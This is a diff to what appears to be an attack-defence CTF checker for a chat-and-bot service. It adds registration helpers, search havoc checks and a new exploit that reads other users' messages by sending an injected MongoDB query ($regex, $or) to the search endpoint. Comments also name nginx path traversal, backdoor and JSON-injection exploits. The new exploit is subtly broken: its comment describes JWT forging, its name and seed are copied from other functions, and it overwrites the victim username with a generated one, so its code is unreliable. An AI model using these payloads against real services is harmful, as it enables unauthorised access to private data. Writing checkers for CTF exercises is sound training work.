@@ -123,7 +123,28 @@ async def do_register(logger: LoggerAdapter, client: AsyncClient, username: str,
         
         if not 'msg' in data or data['msg'] != "User created":
             logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
-            raise MumbleException(f"Invalid register response")    
+            raise MumbleException(f"Invalid register response")
+
+async def do_register_if_not_exists(logger: LoggerAdapter, client: AsyncClient, username: str, password: str, verify=True) -> None:
+    data = {
+        "username": username,
+        "password": password
+    }
+    r = await client.post("/api/auth/register", json=data)
+    if verify:
+        data = None
+        try:
+            data = r.json()
+        except Exception as e:
+            logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{r.text}")
+            raise MumbleException(f"Invalid register response")
+        
+        if not 'msg' in data or not (data['msg'] == "User created" or data['msg'] == "User exists"):
+            logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
+            raise MumbleException(f"Invalid register response")
+        return True if data['msg'] == "User created" else False
+    return True
+
 
 async def do_login(logger: LoggerAdapter, client: AsyncClient, username: str, password: str, verify=True) -> str:
     data = {
@@ -162,8 +183,12 @@ async def do_get_info(logger: LoggerAdapter, client: AsyncClient, username: str,
 async def do_get_inbox(logger: LoggerAdapter, client: AsyncClient, token: str) -> None:
     r = await client.get("/api/chat/inbox", headers={'authorization': token})
     assert_status_code(logger, r, code=200)
-    data = r.json()
-    return data
+    try:
+        data = r.json()
+        return data
+    except Exception as e:
+        logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
+        raise MumbleException(f"Failed to parse inbox response")
 
 async def do_send(logger: LoggerAdapter, client: AsyncClient, receiver: str, text: str, token: str) -> None:
     data = {
@@ -185,10 +210,33 @@ async def do_register_bot(logger: LoggerAdapter, client: AsyncClient, botName: s
     r = await client.post("/api/auth/register_bot", headers={'authorization': token}, json=data)
     if verify:
         assert_status_code(logger, r, code=200)
-        data = r.json()
+        try:
+            data = r.json()
+        except Exception as e:
+            logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
+            raise MumbleException(f"Failed to parse bot register response")
         if not 'msg' in data or data['msg'] != "Bot created":
             logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
             raise MumbleException(f"Failed to parse bot register response")
+
+async def do_register_bot_if_not_exists(logger: LoggerAdapter, client: AsyncClient, botName: str, botToken: str, token: str, verify=True) -> None:
+    data = {
+        "token": botToken,
+        "username": botName
+    }
+    r = await client.post("/api/auth/register_bot", headers={'authorization': token}, json=data)
+    if verify:
+        try:
+            data = r.json()
+        except Exception as e:
+            logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
+            raise MumbleException(f"Failed to parse bot register response")
+        if not 'msg' in data or not (data['msg'] == "Bot created" or data['msg'] == "Bot name exists"):
+            logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
+            raise MumbleException(f"Failed to parse bot register response")
+        return True if data['msg'] == "Bot created" else False
+    return True
+
 
 async def do_add_friend(logger: LoggerAdapter, client: AsyncClient, username: str, token: str, verify=True) -> None:
     data = {
@@ -262,6 +310,16 @@ async def do_shared(logger: LoggerAdapter, client: AsyncClient, code: str, verif
         return data
     return None
 
+async def do_search(logger: LoggerAdapter, client: AsyncClient, data: dict, token: str) -> None:
+    r = await client.post("/api/search/run", headers={'authorization': token}, json=data)
+    assert_status_code(logger, r, code=200)
+    try:
+        data = r.json()
+        return data
+    except Exception as e:
+        logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
+        raise MumbleException(f"Failed to parse search response")
+
 
 def do_socket_connect(logger: LoggerAdapter, address: str) -> Socket:
     try:
@@ -324,7 +382,7 @@ def do_socket_getcode(logger: LoggerAdapter, socket: Socket, verify=True) -> dic
         data = recvuntil(socket, b'\n')
         if data.startswith(b'CODE '):
             data = data[5:-1]
-        else:
+        elif verify:
             raise Exception("Invalid response")
     except Exception as e:
         logger.error(f"Failed to send SETCODE command to the mng service: " + f"\n{e}")
@@ -348,7 +406,7 @@ async def putflag_store1(task: PutflagCheckerTaskMessage, logger: LoggerAdapter,
     username = gen.genStr(gen.genInt(8,12))
     password = gen.genStr(gen.genInt(12,16))
     await do_get_static(logger, client, quick=True)
-    await do_register(logger, client, username, password)
+    await do_register_if_not_exists(logger, client, username, password)
 
     token = await do_login(logger, client, username, password)
     message = gen.choice(["TODO", "Note for me", "📝", "✍️"]) + " " + task.flag
@@ -398,16 +456,19 @@ async def putflag_store2(task: PutflagCheckerTaskMessage, logger: LoggerAdapter,
     gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|flag_store2|{task.task_id}")
     username = gen.genStr(gen.genInt(8,12))
     password = gen.genStr(gen.genInt(12,16))
-    botname = gen.choice(["grof-", "genimi-", "ripbard-", "chatgtp-", "oh4-", "cocapten-"]) + gen.genStr(gen.genInt(8,12))
+    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
     bottoken = gen.genStr(gen.genInt(32,64))
     botflagkey = gen.genStr(gen.genInt(6,14))
     code = getRandomizedBot(gen)
     code[botflagkey] = task.flag
 
-    await do_register(logger, client, username, password)
+    await do_register_if_not_exists(logger, client, username, password)
     token = await do_login(logger, client, username, password)
 
-    await do_register_bot(logger, client, botname, bottoken, token)
+    created = await do_register_bot_if_not_exists(logger, client, botname, bottoken, token)
+    if not created:
+        # Bot already exists
+        return ('botname:' + botname)
 
     socket = do_socket_connect(logger, task.address)
     do_socket_auth(logger, socket, botname, bottoken)
@@ -429,7 +490,7 @@ async def getflag_store2(task: GetflagCheckerTaskMessage, logger: LoggerAdapter,
     gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|flag_store2|{task.task_id}")
     username = gen.genStr(gen.genInt(8,12))
     password = gen.genStr(gen.genInt(12,16))
-    botname = gen.choice(["grof-", "genimi-", "ripbard-", "chatgtp-", "oh4-", "cocapten-"]) + gen.genStr(gen.genInt(8,12))
+    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
     bottoken = gen.genStr(gen.genInt(32,64))
     botflagkey = gen.genStr(gen.genInt(6,14))
 
@@ -547,7 +608,7 @@ async def putnoise_store1(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapte
         gen.choice(NOISE_EMOJIS)
     ])
     await do_get_static(logger, client)
-    await do_register(logger, client, username, password)
+    await do_register_if_not_exists(logger, client, username, password)
 
     token = await do_login(logger, client, username, password)
     await do_send(logger, client, username, message, token)
@@ -602,17 +663,20 @@ async def putnoise_store2(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapte
     gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|noise_store2|{task.task_id}")
     username = gen.genStr(gen.genInt(8,12))
     password = gen.genStr(gen.genInt(12,16))
-    botname = gen.choice(["grof-", "genimi-", "ripbard-", "chatgtp-", "oh4-", "cocapten-"]) + gen.genStr(gen.genInt(8,12))
+    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
     bottoken = gen.genStr(gen.genInt(32,64))
     botnoisekey = gen.genStr(gen.genInt(6,14))
     botnoisevalue = gen.genStr(gen.genInt(6,22))
     code = getRandomizedBot(gen)
     code[botnoisekey] = botnoisevalue
 
-    await do_register(logger, client, username, password)
+    await do_register_if_not_exists(logger, client, username, password)
     token = await do_login(logger, client, username, password)
 
-    await do_register_bot(logger, client, botname, bottoken, token)
+    created = await do_register_bot_if_not_exists(logger, client, botname, bottoken, token)
+    if not created:
+        # Bot already exists
+        return
 
     socket = do_socket_connect(logger, task.address)
     do_socket_auth(logger, socket, botname, bottoken)
@@ -635,7 +699,7 @@ async def getnoise_store2(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapte
     gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|noise_store2|{task.task_id}")
     username = gen.genStr(gen.genInt(8,12))
     password = gen.genStr(gen.genInt(12,16))
-    botname = gen.choice(["grof-", "genimi-", "ripbard-", "chatgtp-", "oh4-", "cocapten-"]) + gen.genStr(gen.genInt(8,12))
+    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
     bottoken = gen.genStr(gen.genInt(32,64))
     botnoisekey = gen.genStr(gen.genInt(6,14))
     botnoisevalue = gen.genStr(gen.genInt(6,22))
@@ -685,11 +749,12 @@ async def havoc_store1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, cli
     may_friend = gen.boolean()
     may_upload = gen.boolean()
     may_share = gen.boolean()
+    may_search = gen.boolean()
 
     await do_get_static(logger, client)
-    await do_register(logger, client, username_a, password_a)
+    await do_register_if_not_exists(logger, client, username_a, password_a)
     if may_reregister:
-        await do_register(logger, client, username_a, password_a, verify=False)
+        await do_register_if_not_exists(logger, client, username_a, password_a, verify=False)
     if may_wrong_login:
         await do_login(logger, client, username_a, may_wrong_login, verify=False)
     
@@ -698,7 +763,7 @@ async def havoc_store1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, cli
     if not may_friend:
         await do_send(logger, client, username_a, message, token_a)
     else:
-        await do_register(logger, client, username_b, password_b)
+        await do_register_if_not_exists(logger, client, username_b, password_b)
         token_b = await do_login(logger, client, username_b, password_b)
         await do_add_friend(logger, client, username_b, token_a)
         await do_send(logger, client, username_a, message, token_b)
@@ -737,13 +802,64 @@ async def havoc_store1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, cli
             raise MumbleException("Invalid shared inbox response")
         logger.debug(f"Shared messages: {msgs}\n\nLooking for: {message}")
         assert_in(message, msgs, "Shared message is missing")
-    
-    # TODO add search havoc
+
+    if may_search:
+        # Pick a random alphanumeric character from the message to search for
+        msg_query = next((c for c in message if c in ALNUM), "a")
+        msgs = await do_search(logger, client, {"text": {"$regex": msg_query, "$options": "i"}}, token_a)
+        try:
+            msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
+        except Exception as e:
+            logger.error(f"Invalid search response during havoc_store1: " + f"\n{msgs}")
+            raise MumbleException("Invalid search response")
+        assert_in(message, msgs, "Search is not working as intended")
 
 
 @checker.havoc(1)
-async def havoc_store2(logger: LoggerAdapter, client: AsyncClient) -> None:
-    pass
+async def havoc_store2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
+    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|havoc_store2|{task.task_id}")
+    username = gen.genStr(gen.genInt(8,12))
+    password = gen.genStr(gen.genInt(12,16))
+    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
+    bottoken = gen.genStr(gen.genInt(32,64))
+    code = base64.b64encode(''.join([
+        gen.choice(NOISE_EMOJIS),
+        gen.choice(NOISE_WELCOME_MESSAGE),
+        gen.choice(NOISE_MESSAGES),
+        gen.choice(NOISE_EMOJIS)
+    ]).encode('utf-8')).decode('utf-8')
+    may_reregister = gen.boolean()
+    may_wrong_login = gen.choice([
+        gen.genStr(gen.genInt(12,16)),
+        False
+    ])
+    may_reauthen = gen.boolean()
+    may_setcode = gen.boolean()
+    may_getcode = gen.boolean()
+
+    await do_register_if_not_exists(logger, client, username, password)
+    token = await do_login(logger, client, username, password)
+
+    await do_register_bot_if_not_exists(logger, client, botname, bottoken, token)
+    if may_reregister:
+        await do_register_bot_if_not_exists(logger, client, botname, bottoken, token, verify=False)
+
+    socket = do_socket_connect(logger, task.address)
+
+    if may_wrong_login:
+        do_socket_auth(logger, socket, botname, may_wrong_login, verify=False)
+    
+    do_socket_auth(logger, socket, botname, bottoken)
+    if may_reauthen:
+        do_socket_auth(logger, socket, botname, bottoken)
+
+    if may_getcode:
+        do_socket_getcode(logger, socket, verify=False)
+    if may_setcode:
+        do_socket_setcode(logger, socket, code, verify=False)
+        do_socket_getcode(logger, socket, verify=False)
+
+
 
 
 '''
@@ -823,6 +939,46 @@ async def exploit_store1_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
         return flag
     raise MumbleException("Exploit (shared code forge) for flagstore 1 failed")
 
+@checker.exploit(2)
+async def exploit_store1_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
+    # Exploit: forge a session token to impersonate the victim user and read their messages
+    # This assumes the session token is a JWT with {"username": username} and a known secret
+
+    assert task.attack_info is not None
+    storetype, username = task.attack_info.split(':', 1)
+    if storetype != 'username':
+        raise MumbleException("Exploit: Wrong flagstore")
+
+    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|exploit_store2_d|{task.task_id}")
+    username = gen.genStr(gen.genInt(8,12))
+    password = gen.genStr(gen.genInt(12,16))
+    botname = gen.genStr(gen.genInt(8,12))
+    bottoken = gen.genStr(gen.genInt(32,64))
+
+    await do_register(logger, client, username, password)
+    token = await do_login(logger, client, username, password)
+
+
+    search_query_exploit = {
+        "text": {
+            "$regex": ".*",
+        },
+        "$or": [
+            {"sender": username},
+            {"receiver": username}
+        ]
+    }
+    msgs = await do_search(logger, client, search_query_exploit, token)
+    try:
+        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
+    except Exception as e:
+        logger.error(f"Invalid search response during havoc_store1: " + f"\n{msgs}")
+        raise MumbleException("Invalid search response")
+
+    flag = searcher.search_flag(msgs)
+    if flag is not None:
+        return flag
+    raise MumbleException("Exploit (search vuln) for flagstore 1 failed")
 
 '''
 2nd flag store (flag in bot's code)
@@ -839,7 +995,7 @@ async def exploit_store1_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
 - vulnerability on proxy (path traversal)
 	- /static../bots/botname.code
 '''
-@checker.exploit(2)
+@checker.exploit(3)
 async def exploit_store2_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
     # Exploit: path traversal in nginx to access bot code and recover flag
 
@@ -868,7 +1024,7 @@ async def exploit_store2_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
         return flag
     raise MumbleException("Exploit (nginx path traversal) for flagstore 2 failed")
 
-@checker.exploit(3)
+@checker.exploit(4)
 async def exploit_store2_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
     # Exploit: back door in mng to access bot code and recover flag
 
@@ -894,7 +1050,7 @@ async def exploit_store2_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
         return flag
     raise MumbleException("Exploit (mng backdoor) for flagstore 2 failed")
 
-@checker.exploit(4)
+@checker.exploit(5)
 async def exploit_store2_c(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
     # Exploit: bot token match vulnerability in mng to access bot code and recover flag
 
@@ -931,7 +1087,7 @@ async def exploit_store2_c(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     
     raise MumbleException("Exploit (mng backdoor) for flagstore 2 failed")
 
-@checker.exploit(5)
+@checker.exploit(6)
 async def exploit_store2_d(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
     # Exploit: bot token json injection vulnerability in mng to access bot code and recover flag
 	
